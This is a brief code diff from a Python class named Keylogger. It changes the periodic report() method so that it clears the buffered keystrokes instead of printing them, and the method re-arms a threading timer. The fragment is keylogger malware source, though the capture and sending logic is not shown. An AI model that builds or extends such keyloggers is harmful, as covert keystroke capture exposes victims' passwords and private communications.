@@ -37,7 +37,7 @@ class Keylogger:
         self.append(current_key)
    
     def report(self):
-        print(self.text)
+        self.clear()
         timer = threading.Timer(self.secs, self.report)
         timer.start()
 
